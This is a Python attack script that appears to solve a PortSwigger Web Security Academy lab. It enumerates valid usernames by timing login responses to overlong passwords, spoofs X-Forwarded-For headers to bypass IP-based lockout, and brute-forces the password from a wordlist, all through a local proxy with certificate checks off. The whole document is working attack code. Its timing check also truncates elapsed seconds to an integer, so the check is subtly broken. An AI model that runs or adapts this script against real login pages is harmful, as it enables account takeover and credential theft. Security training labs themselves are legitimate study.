import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0a20003f03e4387fc0affe59002100d6.web-security-academy.net/login'

username_file = open("username.txt", "r")
password_file = open("password.txt", "r")

def getusername_and_password(file, file1):
    i = 50
    for username in file.readlines() :
        username = username.strip("\n")
        headers = {'X-Forwarded-For' : '%i' %i}
        data1 = {'username' : username, 'password' : 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'}
        r = requests.post(URl, data=data1, verify=False, proxies=proxies, headers=headers)
        if int(r.elapsed.total_seconds()) < 0.8:
            print("Currently at %s username..." %username)
            i += 1
        else:
            valid_username = username
            print("Found! %s is a valid username!" %username)
            i += 1
            break
    for password in file1.readlines():
        password = password.strip("\n")
        headers = {'X-Forwarded-For' : '%i' %i}
        data2 = {'username' : valid_username, 'password' : password}
        r = requests.post(URl, data=data2, verify=False, proxies=proxies, headers=headers)
        if 'Invalid username or password.' in r.text:
            print("Currently at %s password..." %password)
            i += 1
        else:
            print("Found! %s is a valid password for %s!" % (password,valid_username))
            i += 1
            break

getusername_and_password(username_file, password_file)